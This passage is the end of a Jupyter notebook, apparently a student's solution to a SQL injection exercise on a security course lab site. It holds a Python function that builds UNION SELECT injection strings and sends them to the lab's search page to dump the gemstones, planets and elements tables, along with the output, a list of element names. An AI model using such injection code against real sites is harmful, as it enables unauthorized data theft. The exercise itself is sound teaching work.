'', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Gadolinium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Gallium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Germanium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Gold', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hafnium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hassium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Helium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Holmium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hydrogen', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Indium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Iodine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Iridium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Iron', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Krypton', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lanthanum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lawrencium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lead', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lithium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lutetium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Magnesium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Manganese', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Meitnerium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Mendelevium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Mercury', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Molybdenum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Neodymium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Neon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Neptunium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Nickel', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Niobium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Nitrogen', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Nobelium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Osmium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Oxygen', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Palladium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Phosphorus', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Platinum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Plutonium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Polonium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Potassium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Praseodymium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Promethium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Protactinium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Radium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Radon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rhenium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rhodium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rubidium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ruthenium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rutherfordium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Samarium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Scandium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Seaborgium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Selenium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Silicon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Silver', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sodium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Strontium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sulfur', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tantalum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Technetium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tellurium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Terbium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Thallium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Thorium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Thulium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tin', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Titanium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tungsten', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununbium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununhexium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununnilium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununoctium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununpentium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununquadium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununseptium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ununtrium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Unununium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Uranium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Vanadium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Xenon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ytterbium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Yttrium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Zinc', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Zirconium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n"
     ]
    }
   ],
   "source": [
    "# On utilise le champ sql de sqlite_master pour avoir la description des objets et donc on a les nomes des colomnes\n",
    "def generate_inject(fields, table):\n",
    "    while len(fields) < 21:\n",
    "        fields.append(\"''\")\n",
    "    injection = \"' UNION SELECT \" + \",\".join(fields) + \" from \" + table + \" ;--\"\n",
    "    page = requests.get(\n",
    "        \"http://labosecuipl.alwaysdata.net/22/s03/ex6/\",\n",
    "        params={\"name\": injection} \n",
    "        # SELECT ? FROM <table> WHERE name LIKE 'input';--\n",
    "        )\n",
    "    return page.text\n",
    "print(parse_result(generate_inject([\"gemstone\"], \"gemstones\")))\n",
    "print('-------')\n",
    "print(parse_result(generate_inject([\"planet\"], \"planets\")))\n",
    "print('-------')\n",
    "print(parse_result(generate_inject([\"name\"],\"elements\")))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.12 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  },
  "vscode": {
   "interpreter": {
    "hash": "ad2bdc8ecc057115af97d19610ffacc2b4e99fae6737bb82f5d7fb13d2f2c186"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
